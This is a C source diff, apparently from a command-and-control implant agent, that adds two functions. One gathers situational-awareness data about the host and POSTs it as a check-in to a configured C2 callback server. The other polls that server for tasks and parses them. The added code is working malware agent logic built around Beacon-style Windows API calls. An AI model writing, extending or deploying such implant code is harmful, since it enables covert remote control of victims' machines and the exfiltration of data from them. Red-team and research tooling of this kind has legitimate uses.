@@ -113,6 +113,34 @@ void free_checkin_reply(CheckinReply *reply) {
 	if (reply->status != NULL) { KERNEL32$VirtualFree(reply->status, 0, MEM_RELEASE); }
 }
 
+void perform_checkin(AgentParams *params, AgentCapabilities *cap, HttpHandle *http, CheckinReply *reply) {
+	// Generate checkin payload.
+	CheckinRequest checkin = { 0 };
+	checkin.payload_uuid = clone_str(params->payload_uuid);
+	
+	// Use the checkin PICO to gather basic situational awareness info, if possible.
+	cap->CheckinPicoEntrypoint(&checkin);
+	
+	// Send checkin payload to C2 server.
+	char *msg = generate_checkin_message(&checkin);
+	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
+	HttpBody body = {msg, MSVCRT$strlen(msg)};
+	HttpResponse response = {0};
+	
+	HttpRequest(http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
+	
+	// If we get a 200 response code, parse the reply.
+	if (response.status_code == 200) {
+		parse_checkin_reply(&response, reply);
+	}
+	
+	// Free unneeded allocations.
+	free_checkin_request(&checkin);
+	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
+}
+
 /*
  *
  * TASKING LOGIC
@@ -191,4 +219,30 @@ void free_tasking_reply(TaskingReply *reply) {
 		}
 		KERNEL32$VirtualFree(reply->tasks, 0, MEM_RELEASE);
 	}
+}
+
+void perform_tasking(AgentParams *params, HttpHandle *http, TaskingReply *reply) {
+	// Generate tasking payload.
+	TaskingRequest tasking = { 0 };
+	tasking.callback_uuid = clone_str(params->callback_uuid);
+	tasking.tasking_size = 1;
+	char *msg = generate_tasking_message(&tasking);
+	
+	// Send tasking payload to C2 server.
+	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
+	HttpBody body = {msg, MSVCRT$strlen(msg)};
+	HttpResponse response = {0};
+	
+	HttpRequest(http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
+	
+	// If we get a 200 response code, parse the reply.
+	if (response.status_code == 200) {
+		parse_tasking_reply(&response, reply);
+	}
+	
+	// Free unneeded allocations.
+	free_tasking_request(&tasking);
+	KERNEL32$VirtualFree(msg, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(response.body, 0, MEM_RELEASE);
+	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
 }
